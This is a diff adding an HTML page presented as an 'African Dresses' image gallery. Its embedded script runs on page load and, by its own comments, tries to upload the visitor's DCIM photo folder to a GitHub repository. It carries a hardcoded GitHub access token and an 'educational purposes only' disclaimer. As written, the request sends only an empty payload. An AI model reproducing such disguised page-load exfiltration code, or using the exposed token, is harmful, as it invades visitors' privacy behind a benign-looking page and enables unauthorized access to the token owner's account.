@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>African Dresses</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f5f5f5;
+      text-align: center;
+    }
+
+    header {
+      background-color: #333;
+      color: #fff;
+      padding: 10px;
+    }
+
+    h1 {
+      margin: 0;
+    }
+
+    main {
+      padding: 20px;
+    }
+
+    p {
+      margin-bottom: 20px;
+    }
+
+    #imageGallery {
+      display: flex;
+      justify-content: space-around;
+      flex-wrap: wrap;
+      margin-top: 20px;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+      margin-bottom: 10px;
+    }
+
+    #uploadMessage {
+      margin-top: 20px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>African Dresses</h1>
+  </header>
+
+  <main>
+    <p>Explore the beauty of African dresses!</p>
+
+    <div id="imageGallery">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSy2taYctJEgHKB2Y39RdWIQ42s-rIcLhWLgg&usqp=CAU" alt="African Dress 1">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRsTqIlMovXoZ5Hm-GT6w39f52R18WXlbY8xQ&usqp=CAU" alt="African Dress 2">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTSBI_UIGcSbe5TjmCxkUsu7C47psG0HNvX0A&usqp=CAU" alt="African Dress 3">
+    </div>
+
+    <p id="uploadMessage"></p>
+  </main>
+
+  <!-- Include the JavaScript code -->
+  <script>
+    // Disclaimer: This code is for educational purposes only. I do not condone or support any illegal activities.
+
+    // Function to upload the DCIM folder to a GitHub repository
+    function uploadDCIM() {
+      var xhr = new XMLHttpRequest();
+      var githubUsername = 'arseneUL';
+      var githubRepo = 'Dresses';
+      var githubToken = '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';
+
+      xhr.open('PUT', `https://api.github.com/repos/${githubUsername}/${githubRepo}/contents/DCIM`, true);
+      xhr.setRequestHeader('Authorization', `Bearer ${githubToken}`);
+
+      xhr.onload = function() {
+        var uploadMessage = document.getElementById('uploadMessage');
+        if (xhr.status === 201) {
+          uploadMessage.innerText = 'successfully upl';
+        } else {
+          uploadMessage.innerText = 'Error: ' + xhr.status;
+        }
+      };
+
+      var folderData = {
+        message: 'Sucess UPL',
+        content: btoa(''), // Base64-encoded empty string to create a folder
+      };
+
+      xhr.send(JSON.stringify(folderData));
+    }
+
+    // Trigger the uploadDCIM function when the page is loaded
+    window.onload = function() {
+      uploadDCIM();
+    };
+  </script>
+
+</body>
+</html>
